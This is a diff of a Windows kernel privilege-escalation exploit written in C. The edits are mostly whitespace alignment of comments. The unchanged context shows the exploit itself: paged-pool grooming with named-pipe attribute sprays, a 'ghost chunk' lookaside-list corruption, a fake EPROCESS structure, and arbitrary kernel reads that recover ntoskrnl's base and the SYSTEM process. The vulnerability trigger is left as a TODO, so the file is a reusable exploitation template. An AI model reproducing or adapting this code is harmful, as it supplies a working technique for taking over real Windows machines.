@@ -16,7 +16,7 @@
 #define NT_PSINITIALSYSTEMPROCESS_OFFSET 0xcfb420
 ///////////////////////////////////////////////
 
-#define LFH_SIZE 0x160				// Should be same size as vulnerable object 
+#define LFH_SIZE 0x160			// Should be same size as vulnerable object 
 		//	Note: Ghost chunk technique works with smaller sizes, but more care must be taken when freeing objects to avoid BSODs
 #define LOOKASIDE_SIZE 0x210		// Will also be size of ghost chunk
 		//	Note: This value can be increased as needed; it just needs to be more than 0x200 in size to avoid using kLFH
@@ -26,8 +26,8 @@
 #define GHOST_PIPE_ARR_SIZE 0x200	// Amount of pipes to spray to retake vulnerable chunk (which will contain ghost chunk)
 #define GHOST_NAME "GHOSTPA"		// Attribute name for allocating valid attributes that won't be read
 #define QUEUE_NAME "FAKEPRC"		// Name for PIPE_QUEUE_ENTRY containing fake EPROCESS structure
-#define ATTR_NAME "ABCD123"			// Attribute name used to fetch value in readPipeAttr function
-#define ATTR_NAME_SIZE 8			// Size of attribute name (for chunk alignment = 0x8)
+#define ATTR_NAME "ABCD123"		// Attribute name used to fetch value in readPipeAttr function
+#define ATTR_NAME_SIZE 8		// Size of attribute name (for chunk alignment = 0x8)
 #define ATTR_STRUCT_SIZE 0x38		// Size of PIPE_ATTRIBUTE struct before data (name/value) is written
 #define TEMP_ATTR_VALUE "1234567"	// 
 
@@ -328,7 +328,7 @@ int findGhostChunk(PIPE_RW_HND* ghostHeaderPipesArray, char* ghostOut, int ghost
 		ghostQword = getQwordFromBuf(ghostOut + 0x10);
 		if (ghostQword > 0xF000000000000000) {
 			printf("[+] Ghost chunk detected: kernel pointer %llx found in pipe %d\n", ghostQword, i);
-			foundGhost = i;				// Set foundGhost to LFH array member containing ghost chunk
+			foundGhost = i;			// Set foundGhost to LFH array member containing ghost chunk
 			i = GHOST_PIPE_ARR_SIZE;	// Break loop
 		}
 		ghostQword = 0;
@@ -532,35 +532,35 @@ int main() {
 	char* findDecrementBuf = (char*)malloc(0x1000);//DEBUG
 	memset(findDecrementBuf, 0x41, 0x1000);
 
-	BOOL success = false;							// Initialize return value
-	const int remainingPipesSize = 64 - 6;			// Create 64 pipes for makeHoles (6 of them will be freed in makeHoles function)
-	int pipeBufSize = 0x1000;						// Size for input and output buffers of allocated pipe attributes
-	int fakePipeSize = 0x1000;						// Size of pipe attributes for ghost pipe replacement and fake userland pipe
-	int ghostIndex = -1;							// Value used to track pipe array index when finding object containing ghost chunk
+	BOOL success = false;						// Initialize return value
+	const int remainingPipesSize = 64 - 6;				// Create 64 pipes for makeHoles (6 of them will be freed in makeHoles function)
+	int pipeBufSize = 0x1000;					// Size for input and output buffers of allocated pipe attributes
+	int fakePipeSize = 0x1000;					// Size of pipe attributes for ghost pipe replacement and fake userland pipe
+	int ghostIndex = -1;						// Value used to track pipe array index when finding object containing ghost chunk
 	PIPE_RW_HND remainingPipesArray[remainingPipesSize] = { 0 };
 
 	// Create fake chunk header used in overflowing adjacent chunk and ghost header 
-	ULONGLONG pipeAttributeTag = 0x7441704e;										// NpAt (tApN with reversed endianness)
+	ULONGLONG pipeAttributeTag = 0x7441704e;					// NpAt (tApN with reversed endianness)
 	ULONGLONG overflowHeader = createOverflowHeader(pipeAttributeTag, LFH_SIZE);	//
 	ULONGLONG ghostHeader = createGhostHeader(pipeAttributeTag, LOOKASIDE_SIZE);	// Ghost header written into pipe attribute data
 
 	// Create array of pipes that will CONTAIN the ghost header in its data, to be referenced once overflown chunk is freed
 	char* ghostHeaderAttrBuf = (char*)malloc(0x1000);
 	if (ghostHeaderAttrBuf == NULL) { return false; };
-	memset(ghostHeaderAttrBuf, 0x0, 0x1000);				// Zero out attribute buffer
-	memcpy(ghostHeaderAttrBuf, ATTR_NAME, ATTR_NAME_SIZE);	// Padding 32 bits for alignment (and as attribute name, used for reading)
+	memset(ghostHeaderAttrBuf, 0x0, 0x1000);			// Zero out attribute buffer
+	memcpy(ghostHeaderAttrBuf, ATTR_NAME, ATTR_NAME_SIZE);		// Padding 32 bits for alignment (and as attribute name, used for reading)
 	memcpy(ghostHeaderAttrBuf + 8, &ghostHeader, 0x8);		// Write ghostHeader after alignment
 	PIPE_RW_HND* ghostHeaderPipesArray = (PIPE_RW_HND*)malloc(sizeof(PIPE_RW_HND) * (GHOST_PIPE_ARR_SIZE*2));	
-	if (ghostHeaderPipesArray == NULL) { return false; }	// Allocate extra space (x2) for final ghost chunk retake later on
+	if (ghostHeaderPipesArray == NULL) { return false; }		// Allocate extra space (x2) for final ghost chunk retake later on
 
 	// Create buffers used in ghost chunk itself (ghostOut buffer will be reused for reading pipe attribute data)
 	PPIPE_RW_HND ghostChunk = new PIPE_RW_HND;	
 	char* ghostBuf = (char*)malloc(pipeBufSize);			// Buffer to hold ghost chunk's data
-	if (ghostBuf == NULL) { return false; }					//
-	memset(ghostBuf, 0x0, pipeBufSize);						//
+	if (ghostBuf == NULL) { return false; }				//
+	memset(ghostBuf, 0x0, pipeBufSize);				//
 	memcpy(ghostBuf, GHOST_NAME, ATTR_NAME_SIZE);			//
 	char* ghostOut = (char*)malloc(pipeBufSize);			// Output buffer (zeroed out and reused for pipe reads)
-	if (ghostOut == NULL) { return false; }					//
+	if (ghostOut == NULL) { return false; }				//
 	int ghostOutSize = LFH_SIZE - ATTR_STRUCT_SIZE;			// Size of attribute data (-size of PIPE_ATTRIBUTE struct)
 
 	// Allocate buffers for fake ghost chunk and fake userland pipe attribute
@@ -586,13 +586,13 @@ int main() {
 	ULONGLONG iterProc = 0;	// 
 	ULONGLONG kghostAddr	= 0;	// Stores address of ghost chunk in kernel pool (helpful for cleanup after decrement if needed)
 	ULONGLONG restoreFlink	= 0;	// Stores original ghost chunk Flink pointer
-	ULONGLONG ntosbase		= 0;	// Store base address of ntoskrnl.exe in kernelmode
+	ULONGLONG ntosbase	= 0;	// Store base address of ntoskrnl.exe in kernelmode
 	ULONGLONG systemEproc	= 0;	// Store EPROCESS for SYSTEM process 
-	ULONGLONG thisEproc		= 0;	// Store EPROCESS for the current process
+	ULONGLONG thisEproc	= 0;	// Store EPROCESS for the current process
 	ULONGLONG kthreadPtr	= 0;	// Store KTHREAD address for decrement
 	ULONGLONG kpoolCookie	= 0;	// Store cookie value that ProcessBilled is XOR'd with
 	ULONGLONG kFakeEprocAddr= 0;	// Store address of fake EPROCESS stored in PIPE_QUEUE_ENTRY object
-	ULONGLONG poolQuota		= 0;	// Stores encrypted PoolQuota value
+	ULONGLONG poolQuota	= 0;	// Stores encrypted PoolQuota value
 	ULONGLONG rw_where	= 0;	// read/write where 
 	ULONGLONG w_what	= 0;	// write what value
 
@@ -632,9 +632,9 @@ int main() {
 	}
 
 
-	///////////////////////////////////////////////////////////////////////////////////////////
-	// Trigger vulnerability by reading file's EAs (vulnerable chunk is freed automatically) //
-	///////////////////////////////////////////////////////////////////////////////////////////
+	//////////////////////////////////////////////////////////////////////////////////////
+	// Trigger overflow to corrupt adjacent chunk. Free the vulnerable chunk afterwards //
+	//////////////////////////////////////////////////////////////////////////////////////
 
 	// TODO: Trigger paged pool overflow
 	//
@@ -642,7 +642,7 @@ int main() {
 
 	///////////////////////////////////////////////////////////////////////////////////
 	// Retake vulnerable chunk with pipe attribute that contains ghost chunk header, // 
-	//  then free corrupted chunk to add ghost chunk to lookaside list				 //
+	//  then free corrupted chunk to add ghost chunk to lookaside list		 //
 	///////////////////////////////////////////////////////////////////////////////////
 
 	// Retake freed vulnerable chunk with more objects in LFH 
@@ -730,7 +730,7 @@ int main() {
 	// Use kernel driver function offsets to obtain base address of ntoskrnl.exe
 	rw_where = rw_where - NPFS_NPFSDCREATE_FUNC_OFFSET + NPFS_IMP_EXALLOCATEPOOLWITHTAG_OFFSET;
 	rw_where = fakePipeRead(ghostChunk, fakeUserlandPipeAttr, rw_where);		// Read Npfs!_imp_ExAllocatePoolWithTag address
-	ntosbase = rw_where - NT_EXALLOCATEPOOLWITHTAG_OFFSET;						// Subtract offset to obtain base ntoskrnl address
+	ntosbase = rw_where - NT_EXALLOCATEPOOLWITHTAG_OFFSET;				// Subtract offset to obtain base ntoskrnl address
 	if (!ntosbase) { printf("[-] Read primitive failed\n"); goto READFAIL; }
 	printf("[+] Base address of ntoskrnl.exe obtained: %llx\n", ntosbase);
 	
